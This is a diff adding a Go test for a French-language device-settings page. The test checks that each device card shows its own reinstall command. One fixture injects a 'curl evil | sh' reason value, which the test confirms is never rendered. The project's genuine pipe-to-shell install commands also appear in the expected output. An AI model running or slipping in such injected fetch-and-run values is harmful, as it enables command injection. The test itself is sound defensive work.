@@ -395,3 +395,38 @@ func TestWebUpdateStalled(t *testing.T) {
 	hasAll(t, "stalled", body, "arrêtée sans résultat", `value="node:pc"`)
 	hasNone(t, "stalled", body, "data-update-poll", "Mise à jour en cours")
 }
+
+// A device whose update needs its user says so on its card, with the
+// command of its own install to copy: the node names the reason, never the
+// command. Nothing while a request is under way, nor once it needs nothing.
+func TestWebUpdateNeeds(t *testing.T) {
+	tw, h := newUpdatesWeb(t)
+	setNode(t, tw.c, "mac", `{"os":"darwin","install":"macos","version":"0.1.0","update":{"updater":true,"layout":2,"needs":{"why":"password"}}}`)
+	setNode(t, tw.c, "pc", `{"os":"linux","install":"windows","version":"0.1.0","update":{"updater":true,"needs":{"why":"admin"}}}`)
+	setNode(t, tw.c, "nas", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true,"needs":{"why":"curl evil | sh"}}}`)
+	setNode(t, tw.c, "done", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true,"layout":2}}`)
+	_, body, _ := tw.do("GET", "/settings/devices", nil, nil)
+	hasAll(t, "needs", body, "Cette mise à jour a besoin de toi :",
+		"dans le Terminal du Mac", `<pre id="needs-node:mac">curl -fsSL https://github.com/Alexis-Marcel/eriphe-system/releases/latest/download/install.sh | sh -s</pre>`,
+		`data-copy="needs-node:mac"`,
+		"dans un PowerShell administrateur", `<pre id="needs-node:pc">irm https://github.com/Alexis-Marcel/eriphe-system/releases/latest/download/install.ps1 | iex</pre>`,
+		`<pre id="needs-node:nas">curl -fsSL`, "Elle ajoute ce que sa nouvelle version demande")
+	hasNone(t, "needs", body, "curl evil", `id="needs-node:done"`)
+	// On the card's own fragment too, which follows its updates.
+	_, body, _ = tw.do("GET", "/settings/devices/mac/update", nil, h)
+	hasAll(t, "needs, the card's fragment", body, "Cette mise à jour a besoin de toi :", `data-copy="needs-node:mac"`)
+	for _, why := range []string{"layout", "password", "admin"} {
+		if en := tr("en", "update.needs."+why); en == "" || en == tr("fr", "update.needs."+why) {
+			t.Errorf("update.needs.%s: no English", why)
+		}
+	}
+	// Under way: the update may bring it, nothing is asked meanwhile.
+	tw.do("POST", "/settings/updates/request", url.Values{"machine": {"node:done"}}, h)
+	setNode(t, tw.c, "done", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true,"needs":{"why":"layout"}}}`)
+	r := tw.c.pendingUpdate("node:done")
+	if r == nil {
+		t.Fatal("no request")
+	}
+	_, body, _ = tw.do("GET", "/settings/devices/done/update?id="+r.ID, nil, h)
+	hasNone(t, "needs under way", body, `id="needs-node:done"`)
+}
